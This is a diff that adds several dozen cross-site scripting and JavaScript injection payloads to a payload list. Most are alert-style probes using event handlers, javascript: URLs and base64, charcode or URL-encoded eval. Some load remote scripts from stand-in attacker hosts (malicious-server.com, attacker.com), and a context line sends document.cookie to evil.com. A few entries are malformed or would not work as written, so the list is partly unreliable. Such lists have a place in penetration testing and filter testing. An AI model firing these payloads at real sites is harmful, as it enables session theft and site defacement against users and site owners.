@@ -38,6 +38,74 @@
 <script>history.replaceState({}, '', 'http://evil.com/steal-data.php?cookie='+document.cookie)</script>
 <script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 74, 83, 32, 105, 110, 106, 101, 99, 116, 105, 111, 110, 39, 41))</script>
 <script>document.body.innerHTML="<h1>This site has been hacked by JS injection!</h1>";</script>
+";alert('JS Injection Attack!');"
+";document.write('<script>alert("JS Injection Attack!");</script>');"
+";eval('alert("JS Injection Attack!")');"
+";prompt('JS Injection Attack!');"
+";document.body.innerHTML='<script>alert("JS Injection Attack!");</script>';"
+";window.location='javascript:alert("JS Injection Attack!")';"
+";document.createElement('script').src='https://malicious-server.com/injection.js';"
+";document.location.href='javascript:alert("JS Injection Attack!")';"
+";document.write('<script src="https://malicious-server.com/injection.js"></script>');"
+";window.onload=function(){alert('JS Injection Attack!');}"
+<script>alert(1);</script>
+<img src="javascript:alert(1);">
+<iframe src="javascript:alert(1);">
+<a href="javascript:alert(1);">Click here</a>
+<svg onload="javascript:alert(1);">
+<body onload="javascript:alert(1);">
+<input type="text" onfocus="javascript:alert(1);">
+<textarea onfocus="javascript:alert(1);"></textarea>
+<select onfocus="javascript:alert(1);">
+<button onclick="javascript:alert(1);">Click me</button>
+"<img src='x' onerror='alert(1)'>"
+"<svg onload='alert(1)'>
+"<<script>alert(1);//<</script>"
+"<img src=x onerror=alert(1)>"
+"<object data=javascript:alert(1)>
+"<svg onload=alert(1)>
+"javascript:alert(1)"
+"javascript:prompt(1)"
+"<body onload=alert(1)>"
+"><script>alert(1)</script>
+" onfocus="alert(1)
+" onmouseover="alert(1)
+<img src=x onerror="alert(1)">
+"><img src=x onerror="alert(1)">
+<svg onload="alert(1)">
+"><svg onload="alert(1)">
+"><a href="javascript:alert(1)">click here</a>
+"><iframe src="javascript:alert(1)">
+"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+"><applet code="java.lang.Runtime.getRuntime().exec('alert(1)')">
+"><script src="//attacker.com/xss.js">
+"><form action="javascript:alert(1)">
+"><input type="text" value="" autofocus onfocus="alert(1)">
+"><textarea autofocus onfocus="alert(1)">
+"><select autofocus onfocus="alert(1)">
+"><button autofocus onfocus="alert(1)">
+"><video src="javascript:alert(1)">
+"><audio src="javascript:alert(1)">
+"><bgsound src="javascript:alert(1)">
+"><link rel="stylesheet" href="javascript:alert(1)">
+"><style>*{x:expression(alert(1))}</style>
+"><!--<img src="--><img src=x onerror=alert(1)>
+"><script>document.write("<img src='"+document.cookie+"'>");</script>
+"><script>document.write(`<img src="'+document.cookie+'">`);</script>
+"><script>document.write(<img src="${document.cookie}">);</script>
+"><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+"><script>eval(atob('YWxlcnQoMSk='))</script>
+"><script>eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))</script>
+"><script>eval(decodeURIComponent('%61%6c%65%72%74%28%31%29%3b'))</script>
+"><script>eval(decodeURIComponent('YWxlcnQoMSk%3d'))</script>
+"><script>eval(decodeURIComponent('YWxlcnQoMSk%253d'))</script>
+
+
+
+
+
+
 
 
 
